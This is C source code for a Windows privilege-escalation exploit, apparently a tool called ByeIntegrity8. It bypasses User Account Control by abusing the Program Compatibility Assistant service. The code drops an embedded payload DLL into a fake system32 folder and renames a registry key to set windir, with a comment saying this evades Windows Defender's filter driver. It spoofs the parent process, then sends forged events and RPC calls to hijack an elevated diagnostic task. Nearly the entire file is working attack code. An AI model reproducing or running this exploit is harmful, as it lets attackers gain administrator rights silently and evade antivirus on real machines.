#include <Windows.h>
#include <evntprov.h>
#include <taskschd.h>
#include <ShlObj.h>
#include <intrin.h>
#include <stdio.h>
#include "pcasvc.h"
#include "pcasvc7.h"
#include "resource.h"

#define g_Instance ((HINSTANCE)&__ImageBase)

extern IMAGE_DOS_HEADER __ImageBase;

const VARIANT VARIANT_VAL = { {{VT_NULL, 0}} };
const GUID AE_LOG = { 0x0EEF54E71, 0x661, 0x422D, {0x9A, 0x98, 0x82, 0xFD, 0x49, 0x40, 0xB8, 0x20} };
const ULONG ZERO_VALUE = 0;
const EVENT_DATA_DESCRIPTOR AE_EVENT_DESCRIPTOR[3] = {
	{(ULONGLONG)(ULONG_PTR)&ZERO_VALUE, sizeof(ULONG)},
	{(ULONGLONG)(ULONG_PTR)&ZERO_VALUE, sizeof(ULONG)},
	{(ULONGLONG)(ULONG_PTR)NULL, 0}
};

EVENT_DESCRIPTOR MessageBoxEvent = {
	0x1F46,
	0,
	0x11,
	0x4,
	0x0,
	0x0,
	0x4000000000000100
};

/* PcaMonitorProcess flags
* Names guessed from reverse-engineering & behavioral analysis
* NOCHAIN means don't use PCA chain; so don't resolve problems
* */
#define PCA_MONITOR_PROCESS_NORMAL 0
#define PCA_MONITOR_PROCESS_NOCHAIN 1
/* Program will be monitored for installer behavior
* If exe is elevated x86, it will be monitored as a
* legacy installer. DM dialog will show when exe
* terminates with abnormal exit code (other than 0). */
#define PCA_MONITOR_PROCESS_AS_INSTALLER 2

/* PcaMonitorProcess/RAiMonitorProcess pointer prototype. Returns standard system error code.
* RAiMonitorProcess returns error codes from PcaSvc & RPC_STATUS error codes.
* PcaSvc needs to be running. It can be started by the INTERACTIVE users.
* This function will start it for us if it's stopped, so no need to worry about that
* Taken & names guessed from reverse-engineering & behavioral analysis */

/*	typedef DWORD(WINAPI* PcaMonitorProcessPtr)(
		HANDLE hProcess,		// handle to process to be monitored
		int unknown0,			// always set to 1
		PWSTR exeFileName,		// full path name to program executable file
		PWSTR cmdLine,			// command line, usually exeName surrounded with quotes
		PWSTR workingDir,		// working directory of program to be monitored, no trailing backslash
		ULONG flags				// set of flags to modify monitoring behavior
	);	*/

/* RAiNotifyUserCallbackExceptionProcess
* RPC call used in Windows 7 to tell PCA that an unhandled exception
* has occured during a user callback. PCA will launch the DM after the process
* exits or after 10 seconds of being called, whichever comes first. Returns
* standard system error code.
* 
* Usually this function is called from PcaSvc itself via NdrServerCall[All][2]. */

/*	long RAiNotifyUserCallbackExceptionProcess(
		wchar_t* exePathName,	// full path name to program executable file
		long unknown0,			// always set to 1
		long processId			// process ID for PcaSvc to use
	); */

/* Writes an event's information without registering its provider
   Definition taken from Geoff Chappell's website */
typedef ULONG(WINAPI* EtwEventWriteNoRegistrationPtr)(
	LPGUID providerId,
	PEVENT_DESCRIPTOR eventDescriptor,
	ULONG userDataCount,
	PEVENT_DATA_DESCRIPTOR userData
);

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return (void __RPC_FAR*)HeapAlloc(GetProcessHeap(), 0, cBytes);
}

void __RPC_USER midl_user_free(void* pBuffer)
{
	HeapFree(GetProcessHeap(), 0, pBuffer);
}

void AzGenRandomString(
	PWSTR buffer
)
{
	LARGE_INTEGER pc;
	for (int i = 0; i < 8; ++i) {
		QueryPerformanceCounter(&pc);

		pc.QuadPart = RotateLeft64((ULONGLONG)(~pc.HighPart) ^ (ULONGLONG)(RotateRight64((ULONGLONG)pc.LowPart << 32,
			(int)(pc.LowPart & ~0xFUL))), (int)(pc.HighPart & ~pc.LowPart));
		pc.HighPart = pc.HighPart & ~pc.LowPart;
		buffer[i] = ((ULONG)pc.HighPart % (90 - 65 + 1)) + 65;
	}
	buffer[8] = L'\0';
}

HRESULT BiStopWdiTask(
	BOOLEAN trace
)
{
	HRESULT hr;
	ITaskService* taskService;
	BSTR string;
	ITaskFolder* wdiFolder = NULL;
	IRegisteredTask* wdiTask = NULL;
	TASK_STATE taskState;

	hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
		&IID_ITaskService, &taskService);
	if (!SUCCEEDED(hr)) {
		if (trace)
			wprintf(L"CoCreateInstance() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}

	hr = taskService->lpVtbl->Connect(taskService, VARIANT_VAL, VARIANT_VAL,
		VARIANT_VAL, VARIANT_VAL);
	if (!SUCCEEDED(hr)) {
		if (trace)
			wprintf(L"ITaskService::Connect() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}

	string = SysAllocString(L"Microsoft\\Windows\\WDI");
	if (!string) {
		if (trace)
			_putws(L"SysAllocString() (0) failed. No memory");
		goto eof;
	}
	hr = taskService->lpVtbl->GetFolder(taskService, string, &wdiFolder);
	SysFreeString(string);
	if (!SUCCEEDED(hr)) {
		if (trace)
			wprintf(L"ITaskService::GetFolder() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}

	string = SysAllocString(L"\\ResolutionHost");
	if (!string) {
		if (trace)
			_putws(L"SysAllocString() (1) failed. No memory");
		goto eof;
	}
	hr = wdiFolder->lpVtbl->GetTask(wdiFolder, string, &wdiTask);
	SysFreeString(string);
	if (!SUCCEEDED(hr)) {
		if (trace)
			wprintf(L"ITaskFolder::GetTask() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}

	hr = wdiTask->lpVtbl->get_State(wdiTask, &taskState);
	if (!SUCCEEDED(hr)) {
		if (trace)
			wprintf(L"IRegisteredTask::get_State() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}
	if (taskState == TASK_STATE_RUNNING) {
		hr = wdiTask->lpVtbl->Stop(wdiTask, 0);
		if (!SUCCEEDED(hr)) {
			if (trace)
				wprintf(L"IRegisteredTask::Stop() failed. HRESULT: %#010x\n", hr);
			goto eof;
		}
	}

eof:
	if (wdiTask)
		wdiTask->lpVtbl->Release(wdiTask);
	if (wdiFolder)
		wdiFolder->lpVtbl->Release(wdiFolder);
	if (taskService)
		taskService->lpVtbl->Release(taskService);
	return hr;
}

int BiTriggerMain(
	void
)
{
	ULONG win32Status;
	EtwEventWriteNoRegistrationPtr EtwEventWriteNoRegistration;
	HMODULE hModule;

	hModule = GetModuleHandleW(L"ntdll.dll");
	if (hModule) {
		EtwEventWriteNoRegistration = (EtwEventWriteNoRegistrationPtr)GetProcAddress(hModule, "EtwEventWriteNoRegistration");
		if (!EtwEventWriteNoRegistration)
			return (int)GetLastError();
	}
	else
		return (int)GetLastError();

	// write an event that PcaSvc will catch that indicates a version message box has been detected
	win32Status = EtwEventWriteNoRegistration((LPGUID)&AE_LOG, &MessageBoxEvent,
		3, (PEVENT_DATA_DESCRIPTOR)&AE_EVENT_DESCRIPTOR);
	if (win32Status != ERROR_SUCCESS)
		return win32Status;

	MessageBoxEvent.Id = 0x1F48;
	// write an event that PcaSvc will catch that indicates a message box with an error icon has been detected
	win32Status = EtwEventWriteNoRegistration((LPGUID)&AE_LOG, &MessageBoxEvent,
		3, (PEVENT_DATA_DESCRIPTOR)&AE_EVENT_DESCRIPTOR);

	return win32Status;
}

RPC_STATUS BiCreatePcaRpcBinding(
	RPC_BINDING_HANDLE* bindingHandle
)
{
	RPC_WSTR strBinding;
	RPC_BINDING_HANDLE hBinding = NULL;
	BYTE sid[SECURITY_MAX_SID_SIZE];
	DWORD sidSize = SECURITY_MAX_SID_SIZE;
	RPC_SECURITY_QOS_V3_W security;
	RPC_STATUS rStatus;

	rStatus = RpcStringBindingComposeW(L"0767a036-0d22-48aa-ba69-b619480f38cb",
		L"ncalrpc", NULL, NULL, NULL, &strBinding);
	if (rStatus) {
		wprintf(L"RpcStringBindingComposeW() failed. Error: %ld\n", rStatus);
		goto eof;
	}
	rStatus = RpcBindingFromStringBindingW(strBinding, &hBinding);
	RpcStringFreeW(&strBinding);
	if (rStatus) {
		wprintf(L"RpcStringBindingComposeW() failed. Error: %ld\n", rStatus);
		goto eof;
	}
	rStatus = RpcBindingSetOption(hBinding, 12, 200);
	if (rStatus) {
		wprintf(L"RpcBindingSetOption() failed. Error: %ld\n", rStatus);
		goto eof;
	}
	rStatus = (RPC_STATUS)CreateWellKnownSid(WinLocalSystemSid, NULL, sid, &sidSize);
	if (!rStatus) {
		wprintf(L"CreateWellKnownSid() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	ZeroMemory(&security, sizeof(RPC_SECURITY_QOS_V3_W));
	security.Version = 3;
	security.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
	security.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;
	security.Sid = sid;
	rStatus = RpcBindingSetAuthInfoExW(hBinding, NULL,
		RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT,
		0, 0, (RPC_SECURITY_QOS*)&security);
	if (rStatus) {
		wprintf(L"RpcBindingSetAuthInfoExW() failed. Error: %ld\n", rStatus);
		goto eof;
	}

	*bindingHandle = hBinding;
	return rStatus;

eof:
	if (hBinding)
		RpcBindingFree(&hBinding);
	return rStatus;
}

int wmain(
	int argc,
	PWCHAR* argv
)
{
	if (argv[0][0] == L'0')
		return BiTriggerMain();
	if (argv[0][0] == L'1') {
		Sleep(2000);
		return 0;
	}
	if (argv[0][0] == L'2') {
		HRESULT hr;
		HANDLE hEvent;

		hEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, L"ByeIntegrity8Delete");
		if (!hEvent) {
			hr = HRESULT_FROM_WIN32(GetLastError());
			goto end;
		}

		hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE |
			COINIT_SPEED_OVER_MEMORY);
		if (!SUCCEEDED(hr))
			goto end;
		
		hr = BiStopWdiTask(FALSE);
		SetEvent(hEvent);
		CoUninitialize();

	end:
		if (hEvent)
			CloseHandle(hEvent);
		return (int)hr;
	}

	int exitCode = EXIT_FAILURE;
	WCHAR cmdLine[2];
	PROCESS_INFORMATION processInfo = { NULL, NULL, 0 };
	STARTUPINFOEXW si;
	HRSRC resource;
	HGLOBAL loadedResource;
	LPVOID payload;
	HANDLE hPayload, hSharedMem = NULL;
	BOOLEAN createdSystemFake = FALSE, createdPayload = FALSE, comReady = FALSE, deleteList = FALSE;
	DWORD writtenBytes;
	HRESULT hr;
	DWORD curDirSize;
	PWSTR curDir = NULL;
	LSTATUS status;
	BOOLEAN taskHijacked = FALSE, usesPca = TRUE;
	PUCHAR pSharedMem = NULL;
	WCHAR exeName[MAX_PATH];
	DWORD exeNameSize;
	SIZE_T attrSize;
	HANDLE explorer = NULL;
	WCHAR keyName[9];
	SC_HANDLE scHandle = NULL, hService = NULL;
	SERVICE_STATUS serviceStatus;
	RPC_BINDING_HANDLE pcaBinding = NULL;
	RPC_STATUS rpcStatus;
	long pcaResult;
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE), hHijackEvent = NULL, hDeleteEvent = NULL;

	SetConsoleTextAttribute(hConsole, 8);
	_putws(L" __________              .___        __                      .__  __             ______  \n" \
		L" \\______   \\___.__. ____ |   | _____/  |_  ____   ___________|__|/  |_ ___.__.  /  __  \\ \n" \
		L"  |    |  _<   |  |/ __ \\|   |/    \\   __\\/ __ \\ / ___\\_  __ \\  \\   __<   |  |  >      < \n" \
		L"  |    |   \\\\___  \\  ___/|   |   |  \\  | \\  ___// /_/  >  | \\/  ||  |  \\___  | /   --   \\\n" \
		L"  |______  // ____|\\___  >___|___|  /__|  \\___  >___  /|__|  |__||__|  / ____| \\______  /\n" \
		L"         \\/ \\/         \\/         \\/          \\/_____/                 \\/             \\/ \n");
	SetConsoleTextAttribute(hConsole, 7);

	if (*(PULONG)0x7FFE026C == 6 && *(PULONG)0x7FFE0270 == 1) {
		cmdLine[0] = L'1';
		cmdLine[1] = L'\0';
		usesPca = FALSE;
	}
	else {
		cmdLine[0] = L'0';
		cmdLine[1] = L'\0';
	}

	si.lpAttributeList = NULL;
	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
	if (!SUCCEEDED(hr)) {
		wprintf(L"CoInitializeEx() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	resource = FindResourceW(g_Instance, MAKEINTRESOURCEW(IDR_PAYLOAD1), L"PAYLOAD");
	if (!resource) {
		wprintf(L"FindResourceW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	loadedResource = LoadResource(g_Instance, resource);
	if (!loadedResource) {
		wprintf(L"LoadResource() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	payload = LockResource(loadedResource);
	if (!payload) {
		wprintf(L"LockResource() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	if (!CreateDirectoryW(L"system32", NULL)) {
		wprintf(L"CreateDirectoryW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	createdSystemFake = TRUE;

	hPayload = CreateFileW(L"system32\\pcadm.dll", FILE_WRITE_ACCESS, FILE_SHARE_READ,
		NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPayload == INVALID_HANDLE_VALUE) {
		wprintf(L"CreateFileW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	createdPayload = TRUE;
	if (!WriteFile(hPayload, payload, SizeofResource(g_Instance, resource), &writtenBytes, NULL)) {
		CloseHandle(hPayload);
		wprintf(L"WriteFile() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	CloseHandle(hPayload);

	if (!SUCCEEDED(BiStopWdiTask(TRUE)))
		goto eof;

	scHandle = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASEW, SC_MANAGER_CONNECT);
	if (!scHandle) {
		wprintf(L"OpenSCManagerW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	hService = OpenServiceW(scHandle, L"PcaSvc", SERVICE_START | SERVICE_QUERY_STATUS);
	if (!hService) {
		wprintf(L"OpenServiceW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	if (!QueryServiceStatus(hService, &serviceStatus)) {
		wprintf(L"QueryServiceStatus() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	if (serviceStatus.dwCurrentState != SERVICE_RUNNING)
		if (!StartServiceW(hService, 0, NULL)) {
			wprintf(L"StartServiceW() failed. Error: %lu\n", GetLastError());
			goto eof;
		}

	exeNameSize = MAX_PATH;
	if (!QueryFullProcessImageNameW(GetCurrentProcess(), 0, exeName, &exeNameSize)) {
		wprintf(L"QueryFullProcessImageNameW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	curDirSize = GetCurrentDirectoryW(0, NULL);
	curDir = HeapAlloc(GetProcessHeap(), 0, curDirSize * sizeof(WCHAR));
	if (curDir) {
		if (!GetCurrentDirectoryW(curDirSize, curDir)) {
			wprintf(L"GetCurrentDirectoryW() failed. Error: %lu\n", GetLastError());
			goto eof;
		}
	}
	else {
		wprintf(L"HeapAlloc() (0) failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
		0, (exeNameSize + 1) * sizeof(WCHAR), L"ByeIntegrity8");
	if (!hSharedMem) {
		wprintf(L"CreateFileMappingW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	pSharedMem = MapViewOfFile(hSharedMem, FILE_MAP_WRITE, 0, 0, 0);
	if (!pSharedMem) {
		wprintf(L"MapViewOfFile() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	memcpy(pSharedMem, exeName, ((ULONG_PTR)exeNameSize + 1) * sizeof(WCHAR));

	hHijackEvent = CreateEventW(NULL, FALSE, FALSE, L"ByeIntegrity8Loaded");
	if (!hHijackEvent) {
		wprintf(L"CreateEventW() (0) failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	hDeleteEvent = CreateEventW(NULL, FALSE, FALSE, L"ByeIntegrity8Delete");
	if (!hDeleteEvent) {
		wprintf(L"CreateEventW() (1) failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	ZeroMemory(&si.StartupInfo, sizeof(STARTUPINFOW));
	si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

	if (usesPca) {
		if (!InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
			wprintf(L"InitializeProcThreadAttributeList() (0) failed. Error: %lu\n", GetLastError());
			goto eof;
		}
		si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, attrSize);
		if (si.lpAttributeList) {
			if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize)) {
				wprintf(L"InitializeProcThreadAttributeList() (1) failed. Error: %lu\n", GetLastError());
				goto eof;
			}

			DWORD pid;

			GetWindowThreadProcessId(GetShellWindow(), &pid);
			if (pid) {
				explorer = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
				if (explorer) {
					if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer,
						sizeof(HANDLE), NULL, NULL)) {
						wprintf(L"UpdateProcThreadAttribute() failed. Error: %lu\n", GetLastError());
						goto eof;
					}
					deleteList = TRUE;
				}
				else {
					wprintf(L"OpenProcess() failed. Error: %lu\n", GetLastError());
					goto eof;
				}
			}
			else {
				wprintf(L"GetWindowThreadProcessId() failed. Error: %lu\n", GetLastError());
				goto eof;
			}
		}
		else {
			wprintf(L"HeapAlloc() (1) failed. Error: %lu\n", GetLastError());
			goto eof;
		}
	}

	// Bypass Windows Defender filter driver catching custom windir creation
	AzGenRandomString(keyName);
	status = RegRenameKey(HKEY_CURRENT_USER, L"Environment", keyName);
	if (status) {
		wprintf(L"RegRenameKey() failed. LSTATUS: %lu\n", status);
		goto eof;
	}
	status = RegSetKeyValueW(HKEY_CURRENT_USER, keyName, L"windir", REG_SZ, curDir,
		curDirSize * sizeof(WCHAR));
	RegRenameKey(HKEY_CURRENT_USER, keyName, L"Environment");
	if (status) {
		wprintf(L"RegSetKeyValueW() failed. LSTATUS: %lu\n", status);
		goto eof;
	}

	status = (LSTATUS)CreateProcessW(exeName, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
		NULL, NULL, (LPSTARTUPINFOW)&si, &processInfo);
	if (!status) {
		wprintf(L"CreateProcessW() failed. Error: %lu\n", GetLastError());
		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
		goto eof;
	}

	rpcStatus = BiCreatePcaRpcBinding(&pcaBinding);
	if (rpcStatus) {
		wprintf(L"BiCreatePcaRpcBinding() failed. Error: %#010x\n", rpcStatus);
		TerminateProcess(processInfo.hProcess, 0);
		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
		goto eof;
	}

	if (usesPca) {
		__try {
			pcaResult = RAiMonitorProcess(pcaBinding, (unsigned long long)processInfo.hProcess, 1,
				exeName, cmdLine, curDir, PCA_MONITOR_PROCESS_NORMAL);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			TerminateProcess(processInfo.hProcess, 0);
			wprintf(L"RAiMonitorProcess() exception: %#010x\n", GetExceptionCode());
			goto eofEarly;
		}
		if (pcaResult) {
			TerminateProcess(processInfo.hProcess, 0);
			wprintf(L"RAiMonitorProcess() failed. Error: %ld\n", pcaResult);
			goto eofEarly;
		}

		ResumeThread(processInfo.hThread);
		WaitForSingleObject(processInfo.hProcess, INFINITE);
		GetExitCodeProcess(processInfo.hProcess, &curDirSize);
		if (curDirSize) {
			wprintf(L"Trigger process exited with error code: %#010x\n", curDirSize);
			goto eofEarly;
		}
	}
	else {
		ResumeThread(processInfo.hThread);

		__try {
			pcaResult = RAiNotifyUserCallbackExceptionProcess(pcaBinding,
				exeName, 1, processInfo.dwProcessId);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			wprintf(L"RAiNotifyUserCallbackExceptionProcess() exception: %#010x\n", GetExceptionCode());
			goto eofEarly;
		}
		if (pcaResult) {
			wprintf(L"RAiNotifyUserCallbackExceptionProcess() failed. Error: %ld\n", pcaResult);
			goto eofEarly;
		}
	}

	if (WaitForSingleObject(hHijackEvent, 20000) == WAIT_TIMEOUT)
		wprintf(L"Diagnostic module task did not launch & exit properly. HRESULT: %#010x\n", hr);
	else
		taskHijacked = TRUE;

eofEarly:
	RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
	if (!usesPca) {
		RegDeleteKeyValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers",
			exeName);
		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Persisted",
			exeName);
	}
	else
		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store",
			exeName);

	if (taskHijacked) {
		SetConsoleTextAttribute(hConsole, 15);
		wprintf(L">>> ");
		SetConsoleTextAttribute(hConsole, 14);
		_putws(L"Exploit successful\n");
		SetConsoleTextAttribute(hConsole, 7);

		exitCode = 0;
	}

	WaitForSingleObject(hDeleteEvent, 20000);

eof:
	if (pcaBinding)
		RpcBindingFree(&pcaBinding);
	if (processInfo.hThread)
		CloseHandle(processInfo.hThread);
	if (processInfo.hProcess)
		CloseHandle(processInfo.hProcess);
	if (explorer)
		CloseHandle(explorer);
	if (hDeleteEvent)
		CloseHandle(hDeleteEvent);
	if (hHijackEvent)
		CloseHandle(hHijackEvent);
	if (pSharedMem)
		UnmapViewOfFile(pSharedMem);
	if (hSharedMem)
		CloseHandle(hSharedMem);
	if (curDir)
		HeapFree(GetProcessHeap(), 0, curDir);
	if (hService)
		CloseServiceHandle(hService);
	if (scHandle)
		CloseServiceHandle(scHandle);
	if (comReady)
		CoUninitialize();
	if (createdPayload)
		DeleteFileW(L"system32\\pcadm.dll");
	if (createdSystemFake)
		RemoveDirectoryW(L"system32");
	if (deleteList)
		DeleteProcThreadAttributeList(si.lpAttributeList);
	if (si.lpAttributeList)
		HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
	return exitCode;
}
